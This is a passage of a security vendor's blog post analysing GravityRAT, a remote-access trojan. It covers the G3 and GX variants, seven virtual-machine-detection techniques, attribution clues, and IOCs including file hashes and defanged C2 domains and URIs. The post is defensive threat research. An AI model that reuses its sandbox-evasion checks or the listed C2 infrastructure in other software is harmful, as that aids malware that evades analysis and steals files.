+<a href="https://4.bp.blogspot.com/-vxszBdqixjI/Wt7L3rW-XgI/AAAAAAAAAXU/8RDRoFQ-LQMW9pwhjeCGNEBTQOK5KoI0gCLcBGAs/s1600/image11.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="204" data-original-width="661" src="https://4.bp.blogspot.com/-vxszBdqixjI/Wt7L3rW-XgI/AAAAAAAAAXU/8RDRoFQ-LQMW9pwhjeCGNEBTQOK5KoI0gCLcBGAs/s1600/image11.png" /></a></div>
+<br />
+This variant has almost identical capabilities as the previous, except one additional functionality: It collects the CPU information in the Win32_Processor entry via WMI request (Processor ID, Name, Manufacturer and the clock speed). The attacker is most likely using this information as part of an anti-vm attempt within this malware. This is used to try and thwart analysis in virtual environments.<br />
+<br />
+In a slight change to the previous variant, the new payloads are executed with a Windows Scheduled Task. This would explain the inclusion of the .NET wrapper.<br />
+<br />
+The analysed sample contained a decoy picture document in the resource section:<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://3.bp.blogspot.com/-_c2bthVW74M/Wt7L9esEUBI/AAAAAAAAAXY/Q08XG-usdkk0x0-7gNXacU-IiGmY4WD-gCLcBGAs/s1600/image14.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="960" data-original-width="720" height="640" src="https://3.bp.blogspot.com/-_c2bthVW74M/Wt7L9esEUBI/AAAAAAAAAXY/Q08XG-usdkk0x0-7gNXacU-IiGmY4WD-gCLcBGAs/s640/image14.jpg" width="480" /></a></div>
+<br />
+<h3 id="h.91xmw661h8o4">
+Version G3</h3>
+<br />
+In August 2017, the author of GravityRAT used a new variant of its malware, G3. Here is the PDB:<br />
+<pre>F:\Projects\g3\G3 Version 4.0\G3\G3\obj\Release\Intel Core.pdb</pre>
+This variant uses the same method as G2, and includes a legitimate library in the resource section. The developers also added additional language support to the library:<br />
+<ul>
+<li>
+German</li>
+<li>
+Spanish</li>
+<li>
+French</li>
+<li>
+Italian</li>
+<li>
+Chinese</li>
+</ul>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://3.bp.blogspot.com/-Eu6_hxb07dg/Wt7MFLv_JHI/AAAAAAAAAXg/0oUTL3M6Z90piQX55oUTJwqo5kNj5QMqQCLcBGAs/s1600/image16.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="98" data-original-width="1050" height="58" src="https://3.bp.blogspot.com/-Eu6_hxb07dg/Wt7MFLv_JHI/AAAAAAAAAXg/0oUTL3M6Z90piQX55oUTJwqo5kNj5QMqQCLcBGAs/s640/image16.png" width="640" /></a></div>
+The author changed the backend of the C2 server with this variant. The URI changed too, it contains the GravityRAT variant name:<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-PTtQK0yUxyI/Wt7MLUjT11I/AAAAAAAAAXk/2O4wnfCkU1QB73cEDvEeJgBihOOFT533ACLcBGAs/s1600/image6.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="205" data-original-width="669" src="https://1.bp.blogspot.com/-PTtQK0yUxyI/Wt7MLUjT11I/AAAAAAAAAXk/2O4wnfCkU1QB73cEDvEeJgBihOOFT533ACLcBGAs/s1600/image6.png" /></a></div>
+<br />
+August was also the same month NIC CERT notified potential victims that GravityRAT had been used in a targeted campaign. Given the ongoing development nature of this malware, it meant another variant was most likely due.<br />
+<br />
+<h3 id="h.lytma7y4ix4r">
+Version GX</h3>
+<br />
+The latest version of GravityRAT was created in December 2017 named GX. Here is the PDB:<br />
+<pre>C:\Users\The Invincible\Desktop\gx\gx-current-program\LSASS\obj\Release\LSASS.pdb</pre>
+This version is the most advanced variant of GravityRAT. Throughout the evolution, we saw this malware embedding open-source legitimate .NET libraries (for schedule tasks, compression, encryption, .NET loading). It contains a resource named "important." This is an archive with a password.<br />
+<br />
+This variant has the same features as before, but this time, some new features are added:<br />
+<ul>
+<li>
+It collects open ports on the victim host by running the netstat command</li>
+<li>
+It lists all the running processes</li>
+<li>
+It lists available services on the system</li>
+<li>
+It exfiltrates .ppt and .pptx file, in addition to the extension mentioned in the G1 variant</li>
+<li>
+If a USB key is connected on the system, the malware steals the file based on an extension list</li>
+<li>
+It supports file encryption (AES with the key "lolomycin2017")</li>
+<li>
+It collects information on the account (account type, description, domain name, full name, SID and status)</li>
+<li>
+It checks if the system is a virtual machine with several techniques</li>
+</ul>
+<br />
+<br />
+The developer implemented a total of seven techniques to identify if the compromised system is a virtual machine.<br />
+<br />
+The first technique consists of looking at any additional tools used by the hypervisor that are installed on the system (by checking a registry key):<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-sfrVtRiOK9Q/Wt7MR1S3QjI/AAAAAAAAAXs/RhwXts3IMcoqu6yWifrss8EAYoAPEJoiACLcBGAs/s1600/image10.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="100" data-original-width="997" height="64" src="https://1.bp.blogspot.com/-sfrVtRiOK9Q/Wt7MR1S3QjI/AAAAAAAAAXs/RhwXts3IMcoqu6yWifrss8EAYoAPEJoiACLcBGAs/s640/image10.png" width="640" /></a></div>
+<br />
+The second technique uses a WMI request to the BIOS version (Win32_BIOS entry). If the response contains: "VMware", "Virtual", "XEN", "Xen" or "A M I" the system is considered as a virtual machine. Additionally, the malware checks the SerialNumber and the version of the BIOS.<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-RHN_i1EGAkw/Wt7Mb5NhnXI/AAAAAAAAAX0/cuEBsYTBZTExwsIqyjIofDN9AHmFuweTwCLcBGAs/s1600/image5.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="229" data-original-width="1031" height="142" src="https://4.bp.blogspot.com/-RHN_i1EGAkw/Wt7Mb5NhnXI/AAAAAAAAAX0/cuEBsYTBZTExwsIqyjIofDN9AHmFuweTwCLcBGAs/s640/image5.png" width="640" /></a></div>
+<br />
+The third technique uses the Win32_Computer entry in WMI. It checks if the manufacturer contains "VIRTUAL", "VMWARE" or "VirtualBox".<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-_bZLneKsNUQ/Wt7MhjEWrMI/AAAAAAAAAX8/jABBWa-hl58U6j0Wg703RBXWeZx4kRKFQCLcBGAs/s1600/image8.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="258" data-original-width="1368" height="120" src="https://2.bp.blogspot.com/-_bZLneKsNUQ/Wt7MhjEWrMI/AAAAAAAAAX8/jABBWa-hl58U6j0Wg703RBXWeZx4kRKFQCLcBGAs/s640/image8.png" width="640" /></a></div>
+The fourth technique checks the Processor ID of the system.<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-mS_Iu7onLK8/Wt7MmiSTQFI/AAAAAAAAAYA/Gud1lq9dLokn83EnajpcOtOy4MQt2BPgQCLcBGAs/s1600/image12.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="256" data-original-width="1001" height="162" src="https://1.bp.blogspot.com/-mS_Iu7onLK8/Wt7MmiSTQFI/AAAAAAAAAYA/Gud1lq9dLokn83EnajpcOtOy4MQt2BPgQCLcBGAs/s640/image12.png" width="640" /></a></div>
+The fifth technique counts the number of cores in the infected system (the author expects more than one core)<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-Zt5D7x7XDyg/Wt7Ms97CSLI/AAAAAAAAAYE/leAGaijJe5sl3yIhY4p2CiF2K8wkNWbHwCLcBGAs/s1600/image9.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="245" data-original-width="1113" height="140" src="https://4.bp.blogspot.com/-Zt5D7x7XDyg/Wt7Ms97CSLI/AAAAAAAAAYE/leAGaijJe5sl3yIhY4p2CiF2K8wkNWbHwCLcBGAs/s640/image9.png" width="640" /></a></div>
+The sixth technique checks the current CPU temperature of the system (the  MSAcpi_ThermalZoneTemperature entry). Indeed, some hypervisors (VMWare, VirtualBox and Hyper-V) do not support temperature check. The WMI request simply replies "not supported". This behaviour can be used to detect if the targeted system is a real machine.<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-lyyUYEU8QMc/Wt7MyhgiXZI/AAAAAAAAAYM/ZnRY4H8SgfEu0ozJngwLhx48VEYeRBuzQCLcBGAs/s1600/image7.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="142" data-original-width="1303" height="68" src="https://2.bp.blogspot.com/-lyyUYEU8QMc/Wt7MyhgiXZI/AAAAAAAAAYM/ZnRY4H8SgfEu0ozJngwLhx48VEYeRBuzQCLcBGAs/s640/image7.png" width="640" /></a></div>
+The last technique uses the MAC Address of the infected system. If the MAC Address starts by a well-known hexadecimal number, the system is identified as a virtual machine.<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-AG6M5oChPus/Wt7M2wcMVyI/AAAAAAAAAYU/NtT04MdbZmYit7d7wBZPVZZYfBiBsPNBwCLcBGAs/s1600/image15.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="247" data-original-width="438" src="https://1.bp.blogspot.com/-AG6M5oChPus/Wt7M2wcMVyI/AAAAAAAAAYU/NtT04MdbZmYit7d7wBZPVZZYfBiBsPNBwCLcBGAs/s1600/image15.png" /></a></div>
+The C2 servers communication is performed in HTTP as it did previously. The variant version of GX is used in the URI. The C2 servers we can see are shared with the previous variants:<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-bS3NywC79sg/Wt7M98eaciI/AAAAAAAAAYc/a7RaSeWNRNwNx8eGavpn8-Bk94SCc4vRQCLcBGAs/s1600/image1.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="141" data-original-width="487" src="https://2.bp.blogspot.com/-bS3NywC79sg/Wt7M98eaciI/AAAAAAAAAYc/a7RaSeWNRNwNx8eGavpn8-Bk94SCc4vRQCLcBGAs/s1600/image1.png" /></a></div>
+<div class="separator" style="clear: both; text-align: center;">
+<br /></div>
+<h2 id="h.kovqvd2fsvx">
+What we know about the author</h2>
+<br />
+Below, we will present evidence that we have obtained regarding the attacker and the associated malware. Obviously, attribution is a complex field. The developers could be using a proxy or a VPN in order to fake the origin of the submission. But, we will still simply present some facts concerning this actor. <br />
+<br />
+The developer used at least two different usernames in the past two years: "The Invincible" and "TheMartian." In the oldest version of GravityRAT, the attacker potentially leaked his or her first name in the PDB: "Adeel" &#8212; the path contained "Adeel's Laptop". Additionally, all the malicious Office documents, and more specifically the documents used to test anti-virus on VirusTotal, were submitted from Pakistan. One of the four PE files in the IOCs section was sent from Pakistan, too.<br />
+<br />
+In August 2017, NIC CERT published an <a href="https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory%20for%20Malicious%20Targeted%20Attack%20Campaign.pdf">advisory </a>about malicious targeted campaigns. This advisory mentions the C2 server infrastructure of GravityRAT, which means the GravityRAT author likely targeted Indian entities/organisations. By leveraging Cisco Umbrella and using the Investigate tool, we were able to determine that across all of the C2 domains listed, we saw a large influx of traffic originating from India, as evidenced by NIC CERT, all of the C2 domains were at least 50 percent requested by Indian IP infrastructure. It is possible that some of the non-Indian IP space requests may artefacts be due to our own research. <br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-xsP6ao_8HoI/Wt7NIpkvteI/AAAAAAAAAYk/CLLFsL828_AzDbFbfaMyh_dbDiOpho4IgCLcBGAs/s1600/image3.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="536" data-original-width="882" height="388" src="https://4.bp.blogspot.com/-xsP6ao_8HoI/Wt7NIpkvteI/AAAAAAAAAYk/CLLFsL828_AzDbFbfaMyh_dbDiOpho4IgCLcBGAs/s640/image3.png" width="640" /></a></div>
+<h2 id="h.lycngv82s92k">
+Conclusion</h2>
+<br />
+This actor is probably not the most advanced actor we've seen. But he or she managed to stay under the radar since 2016. They worked on malicious code, and produced four variants. Each new variant included new features. The developer used the same C2 infrastructure all this time. The developer was clever enough to keep this infrastructure safe, and not have it blocklisted by a security vendor. The actor took their time to ensure they were not within a virtual environment to avoid analysis. However, they did not take any time at all to attempt to obfuscate their .NET code. The code was largely trivial to reverse engineer, which meant static analysis was an easy option for this piece of malware.<br />
+<br />
+NIC CERT published an advisory about this actor, which suggest they targeted Indian entities and organizations.<br />
+<br />
+The author leaked information within the samples (i.e. Adeel) and on the VirusTotal platform. Thanks to this information, we we able to understand how they tested malicious documents in order to decrease detection ratios across many popular engines. During this testing period, all the samples were uploaded from Pakistan to VirusTotal. <br />
+<br />
+<h2 id="h.eb87f48sfwbs">
+Coverage</h2>
+<br />
+Additional ways our customers can detect and block this threat are listed below.<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-87wNIQB7f5M/Wt7NP7q96AI/AAAAAAAAAYs/Jx_ypOoamac3cc0yNNtUqO6JWmo5CP10QCLcBGAs/s1600/image2.png" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="268" data-original-width="320" src="https://4.bp.blogspot.com/-87wNIQB7f5M/Wt7NP7q96AI/AAAAAAAAAYs/Jx_ypOoamac3cc0yNNtUqO6JWmo5CP10QCLcBGAs/s1600/image2.png" /></a></div>
+<br />
+Advanced Malware Protection (<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/advanced-malware-protection&amp;sa=D&amp;ust=1524553763505000">AMP</a>) is ideally suited to prevent the execution of the malware used by these threat actors.<br />
+<br />
+<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html&amp;sa=D&amp;ust=1524553763506000">CWS</a> or<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html&amp;sa=D&amp;ust=1524553763506000"> WSA</a> web scanning prevents access to malicious websites and detects malware used in these attacks.<br />
+<br />
+<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html&amp;sa=D&amp;ust=1524553763507000">Email Security</a> can block malicious emails sent by threat actors as part of their campaign.<br />
+<br />
+Network Security appliances such as<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/firewalls/index.html&amp;sa=D&amp;ust=1524553763508000"> </a><a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/firewalls/index.html&amp;sa=D&amp;ust=1524553763508000">NGFW</a>,<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html&amp;sa=D&amp;ust=1524553763508000"> </a><a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html&amp;sa=D&amp;ust=1524553763508000">NGIPS</a>, and<a href="https://www.google.com/url?q=https://meraki.cisco.com/products/appliances&amp;sa=D&amp;ust=1524553763509000"> </a><a href="https://www.google.com/url?q=https://meraki.cisco.com/products/appliances&amp;sa=D&amp;ust=1524553763509000">Meraki MX</a> can detect malicious activity associated with this threat.<br />
+<br />
+<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html&amp;sa=D&amp;ust=1524553763509000">AMP Threat Grid</a> helps identify malicious binaries and build protection into all Cisco Security products.<br />
+<br />
+<a href="https://www.google.com/url?q=https://umbrella.cisco.com/&amp;sa=D&amp;ust=1524553763510000">Umbrella</a>, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.<br />
+<br />
+Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on <a href="https://www.google.com/url?q=https://www.snort.org/products&amp;sa=D&amp;ust=1524553763510000">Snort.org</a>.<br />
+<br />
+<h2 id="h.pkfv1qbyudos">
+IOCs</h2>
+<br />
+<h3 id="h.gdf0a5rx36zo">
+Malicious Documents</h3>
+<br />
+<h4 id="h.l0d6g63jrddw">
+Macros</h4>
+<br />
+0beb2eb1214d4fd78e1e92db579e24d12e875be553002a778fb38a225cadb703<br />
+70dc2a4d9da2b3338dd0fbd0719e8dc39bc9d8e3e959000b8c8bb04c931aff82<br />
+835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4<br />
+C14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719<br />
+ed0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2a<br />
+f4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136<br />
+<br />
+<h4 id="h.5rblg49mk7g">
+Other Malicious Documents (DDE)</h4>
+<div>
+<br /></div>
+911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024f<br />
+fb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210<br />
+ef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301<br />
+cd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a2<br />
+07682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105<br />
+<h3 id="h.ae0gmkonk3rz">
+GravityRAT</h3>
+<h4 id="h.sknaus2nssb0">
+G1</h4>
+9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3a<br />
+<h4 id="h.b0nyfiq4p8gy">
+G2</h4>
+1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bc<br />
+<h4 id="h.7iqnsch4g8sc">
+G3</h4>
+99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90<br />
+<h4 id="h.xyinmgbw4qo">
+GX</h4>
+1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96<br />
+<h3 id="h.6l339xtxm0bc">
+C2 Servers</h3>
+hxxp://cone[.]msoftupdates.com:46769<br />
+hxxp://ctwo[.]msoftupdates.com:46769<br />
+hxxp://cthree[.]msoftupdates.com:46769<br />
+hxxp://eone[.]msoftupdates.eu:46769<br />
+hxxp://etwo[.]msoftupdates.eu:46769<br />
+hxxp://msupdates[.]mylogisoft.com:46769<br />
+hxxp://coreupdate[.]msoftupdates.com:46769<br />
+hxxp://updateserver[.]msoftupdates.eu:46769<br />
+<br />
+msoftupdates[.]com<br />
+msoftupdates[.]eu<br />
+mylogisoft[.]com<br />
+<br />
+URI:<br />
+/Gvty@/1ns3rt_39291384.php<br />
+/Gvty@/newIns3rt.php<br />
+/Gvty@/payloads<br />
+/Gvty@/ip.php<br />
+/G3/ServerSide/G3.php<br />
+/G3/Payload/<br />
+/GX/GX-Server.php<br />
+/GetActiveDomains.php
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+Posted by
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='https://schema.org/Person'>
+<meta content='https://www.blogger.com/profile/10073079939160046441' itemprop='url'/>
+<a class='g-profile' href='https://www.blogger.com/profile/10073079939160046441' rel='author' title='author profile'>
+<span itemprop='name'>Paul Rascagneres</span>
+</a>
+</span>
+</span>
+<span class='post-timestamp'>
+at
+<meta content='http://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html' itemprop='url'/>
+<a class='timestamp-link' href='https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2018-04-26T11:11:00-04:00'>11:11 AM</abbr></a>
+</span>
+<span class='reaction-buttons'>
+</span>
+<span class='post-comment-link'>
+</span>
+<span class='post-backlinks post-comment-link'>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-1018951857'>
+<a href='https://www.blogger.com/post-edit.g?blogID=1029833275466591797&postID=6188594294975286687&from=pencil' title='Edit Post'>
+<img alt='' class='icon-action' height='18' src='https://img2.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+Labels:
+<a href='https://blog.talosintelligence.com/search/label/.NET' rel='tag'>.NET</a>,
+<a href='https://blog.talosintelligence.com/search/label/APT' rel='tag'>APT</a>,
+<a href='https://blog.talosintelligence.com/search/label/GravityRAT' rel='tag'>GravityRAT</a>,
+<a href='https://blog.talosintelligence.com/search/label/India' rel='tag'>India</a>,
+<a href='https://blog.talosintelligence.com/search/label/macros' rel='tag'>macros</a>,
+<a href='https://blog.talosintelligence.com/search/label/MalDoc' rel='tag'>MalDoc</a>,
+<a href='https://blog.talosintelligence.com/search/label/Malware%20Analysis' rel='tag'>Malware Analysis</a>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<div style='text-align: left;'>
+<div class='social-media-share'>
+<div class='social-call'><span>Share This Post</span></div>
+<a class='facebook' data-text='GravityRAT - The Two-Year Evolution Of An APT Targeting India' href='https://www.facebook.com/sharer.php?u=https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html&text=GravityRAT - The Two-Year Evolution Of An APT Targeting India' rel='nofollow' target='_blank' title='Share This On Facebook'>
+<img alt='Facebook share' border='0' src='https://www.talosintelligence.com/assets/icon_fb-share_grey.svg'/>
+</a>
+<a class='twitter' data-text='GravityRAT - The Two-Year Evolution Of An APT Targeting India' href='https://twitter.com/share?url=https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html&text=GravityRAT - The Two-Year Evolution Of An APT Targeting India' rel='nofollow' target='_blank' title='Tweet This'>
+<img alt='Twitter share' border='0' src='https://www.talosintelligence.com/assets/icon_tw-share_grey.svg'/>
+</a>
+<a class='linkedin' data-text='GravityRAT - The Two-Year Evolution Of An APT Targeting India' href='https://www.linkedin.com/sharing/share-offsite/?url=https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html&text=GravityRAT - The Two-Year Evolution Of An APT Targeting India' rel='nofollow' target='_blank' title='Share This On Linkedin'>
+<img alt='Linkedin share' border='0' src='https://www.talosintelligence.com/assets/icon_li-share_grey.svg'/>
+</a>
+<a class='reddit' data-text='GravityRAT - The Two-Year Evolution Of An APT Targeting India' href='https://www.reddit.com/submit?url=https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html&title=GravityRAT - The Two-Year Evolution Of An APT Targeting India' rel='nofollow' target='_blank' title='Reddit This'>
+<img alt='Reddit share' border='0' src='https://www.talosintelligence.com/assets/icon_re-share_grey.svg'/>
+</a>
+<a href='mailto:?body=https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html&subject=GravityRAT - The Two-Year Evolution Of An APT Targeting India'>
+<img alt='Email This' border='0' src='https://www.talosintelligence.com/assets/icon_em-share_grey.svg'/>
+</a>
+</div>
+</div>
+<span class='post-location'>
+</span>
+</div>
+</div>
+</div>
+<div class='comments' id='comments'>
+<a name='comments'></a>
+<h4>No comments:</h4>
+<div id='Blog1_comments-block-wrapper'>
+<dl class='' id='comments-block'>
+</dl>
+</div>
+<p class='comment-footer'>
+<div class='comment-form'>
+<a name='comment-form'></a>
+<h4 id='comment-post-message'>Post a Comment</h4>
+<p>
+</p>
+<p>Note: Only a member of this blog may post a comment.</p>
+<a href='https://www.blogger.com/comment-iframe.g?blogID=1029833275466591797&postID=6188594294975286687' id='comment-editor-src'></a>
+<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
+<!--Can't find substitution for tag [post.friendConnectJs]-->
+<script src='https://www.blogger.com/static/v1/jsbin/1706263374-comment_from_post_iframe.js' type='text/javascript'></script>
+<script type='text/javascript'>
+                    BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
+                  </script>
+</div>
+</p>
+<div id='backlinks-container'>
+<div id='Blog1_backlinks-container'>
+</div>
+</div>
+</div>
+</div>
+
+                      </div></div>
+                    
+<!--Can't find substitution for tag [adEnd]-->
+</div>
+<div class='blog-pager' id='blog-pager'>
+<span id='blog-pager-newer-link'>
+<a class='blog-pager-newer-link' href='https://blog.talosintelligence.com/2018/04/threat-round-up-0420-0427.html' id='Blog1_blog-pager-newer-link' title='Newer Post'>Newer Post</a>
+</span>
+<span id='blog-pager-older-link'>
+<a class='blog-pager-older-link' href='https://blog.talosintelligence.com/2018/04/hyland-vulnerabilities-code-execution.html' id='Blog1_blog-pager-older-link' title='Older Post'>Older Post</a>
+</span>
+<a class='home-link' href='https://blog.talosintelligence.com/'>Home</a>
+</div>
+<div class='clear'></div>
+<div class='post-feeds'>
+<div class='feed-links'>
+Subscribe to:
+<a class='feed-link' href='https://blog.talosintelligence.com/feeds/6188594294975286687/comments/default' target='_blank' type='application/atom+xml'>Post Comments (Atom)</a>
+</div>
+</div>
+</div></div>
+</div>
+<div id='sidebar-wrapper'>
+<div class='sidebar section' id='sidebar'><div class='widget HTML' data-version='1' id='HTML1'>
+<div class='widget-content'>
+<style>   
+   
+   #search {  
+   /* Old browsers */
+   background: #dedfe1;
+   /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
+   background: 
+     url('https://www.talosintelligence.com/assets/icon_search.svg') 96% 50% no-repeat,
+     linear-gradient(to right, #dedfe1 0%,#dedfe1 84%,#ef6f09 84%,#ef6f09 100%); 
+   /* FF3.6-15 */
+   background: 
+     url('https://www.talosintelligence.com/assets/icon_search.svg') 96% 50% no-repeat,
+     -moz-linear-gradient(left, #dedfe1 0%, #dedfe1 84%, #ef6f09 84%, #ef6f09 100%); 
+   /* Chrome10-25,Safari5.1-6 */
+   background: 
+     url(https://www.talosintelligence.com/assets/icon_search.svg) 96% 50% no-repeat,
+     -webkit-linear-gradient(left, #dedfe1 0%,#dedfe1 84%,#ef6f09 84%,#ef6f09 100%); 
+   
+   text-align: left;  
+   padding: 8px 24px 6px 6px;  
+   line-height: 1em;
+   border-radius: 2px;
+   height: 18px; 
+   cursor: pointer;
+   }  
+   #search:focus {
+    background-color: #fff;
+    box-shadow: inset 0 0 2px 1px #ED6F09;
+    outline: none;
+   }
+   #search #s {  
+   background: none;  
+   color: #303338; 
+   font-family: verdana; 
+
+   font-size: 11px;  
+   border: 0;  
+   width: 100%;  
+   padding: 0;  
+   margin: 0;  
+   outline: none;  
+   }  
+   
+   </style>  
+   
+   <div id="search" title="Type and hit enter"> 
+<form action="/search" id="searchform" method="get"> 
+<input id="s" name="q" type="text" placeholder="Search Blog" /> </form> </div>
+</div>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML1"));' rel='nofollow' target='configHTML1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div><div class='widget HTML' data-version='1' id='HTML2'>
+<h2 class='title'>categories</h2>
+<div class='widget-content'>
+<div id="category_list"></div>
+
+<script>
+    (function () {
+        //These categories MUST match the case of the label IN USE.
+        var categories = ['Headlines', 'threats', 'vulnerabilities', 'Threat Roundup'];
+        var cat_list = document.getElementById('category_list');
+        var selected = [];
+        function select_category(e){
+            e.preventDefault();
+            var cat_path = 'https://blog.talosintelligence.com/search/?q=';
+            target = e.target;
+            search_target = e.target.getAttribute('data-search');
+            var cat_search = 'label:%22' + search_target.replace(/\s/g, '%20') + '%22';
+            switch (e.shiftKey) {
+                case true:
+                    if ( selected.includes(cat_search) ){
+                        var index = selected.indexOf(cat_search);
+                        selected.splice(index, 1);
+                        target.classList.remove('selected');
+                    } else {
+                        selected.push(cat_search);
+                        target.classList.add('selected');
+                    }
+                    break;
+                case false:
+                    if (!selected.includes(cat_search)){
+                        selected.push(cat_search);
+                    }
+                    var new_path = selected.join('||');
+                    selected = [];
+                    location.href = cat_path += new_path;
+                    break;
+            }
+        }
+        categories.forEach((cat)=>{
+            var span = document.createElement('span');
+            var cat_search = cat.replace(/\s/g, '%20');
+            var button = document.createElement('button');
+            var rss_image = document.createElement('img');
+            var rss_a = document.createElement('a');
+            button.addEventListener("click", select_category);
+            button.innerHTML = cat;
+            button.setAttribute('data-search', cat);
+            rss_image.setAttribute('src', 'https://www.talosintelligence.com/assets/icon_rss_orange.svg');
+            rss_image.setAttribute('align', 'absmiddle');
+            rss_a.setAttribute('href', 'https://blog.talosintelligence.com/feeds/posts/default/-/' + cat_search);
+            rss_a.setAttribute('title', cat + ' RSS feed');
+            rss_image.classList.add('feed-icon');
+            rss_a.append(rss_image);
+            span.append(button);
+            span.classList = "individual-category";
+            span.append(rss_a);
+            cat_list.append(span);
+        });
+    })();
+</script>
+</div>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' rel='nofollow' target='configHTML2' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div><div class='widget Subscribe' data-version='1' id='Subscribe1'>
+<div style='white-space:nowrap'>
+<h2 class='title'>Subscribe To Our Feed</h2>
+<div class='widget-content'>
+<div>
+<div class='feed-reader-links subscribe'>
+<a class='feed-reader-link' href='https://blog.talosintelligence.com/feeds/posts/default' target='_blank'>
+<img align='absmiddle' class='feed-icon' src='https://www.talosintelligence.com/assets/icon_rss_orange.svg'/>
+Posts
+</a>
+</div>
+</div>
+<div>
+<div class='feed-reader-links subscribe'>
